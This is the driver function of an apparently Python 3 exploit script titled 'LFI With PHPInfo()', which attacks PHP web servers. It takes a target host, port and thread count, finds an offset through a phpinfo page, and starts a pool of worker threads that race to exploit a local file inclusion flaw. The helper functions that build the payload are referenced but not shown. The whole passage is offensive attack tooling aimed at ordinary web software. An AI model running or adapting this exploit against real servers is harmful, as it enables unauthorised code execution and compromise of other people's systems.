def main():

    print("LFI With PHPInfo()")
    print("-=" * 30)

    if len(sys.argv) < 2:
        print("Usage: %s host [port] [threads]" % sys.argv[0])
        sys.exit(1)

    try:
        host = socket.gethostbyname(sys.argv[1])
    except socket.error as e:
        print("Error with hostname %s: %s" % (sys.argv[1], e))
        sys.exit(1)

    port=80
    try:
        port = int(sys.argv[2])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with port %d: %s" % (sys.argv[2], e))
        sys.exit(1)

    poolsz=10
    try:
        poolsz = int(sys.argv[3])
    except IndexError:
        pass
    except ValueError as e:
        print("Error with poolsz %d: %s" % (sys.argv[3], e))
        sys.exit(1)

    print("Getting initial offset...", end=' ')
    reqphp, tag, reqlfi = setup(host, port)
    offset = getOffset(host, port, reqphp)
    sys.stdout.flush()

    maxattempts = 1000
    e = threading.Event()
    l = threading.Lock()

    print("Spawning worker pool (%d)..." % poolsz)
    sys.stdout.flush()

    tp = []
    for i in range(0,poolsz):
        tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag))

    for t in tp:
        t.start()
    try:
        while not e.wait(1):
            if e.is_set():
                break
            with l:
                sys.stdout.write( "\r% 4d / % 4d" % (counter, maxattempts))
                sys.stdout.flush()
                if counter >= maxattempts:
                    break
        print()
        if e.is_set():
            print("Woot!  \m/")
        else:
            print(":(")
    except KeyboardInterrupt:
        print("\nTelling threads to shutdown...")
        e.set()

    print("Shuttin' down...")
    for t in tp:
        t.join()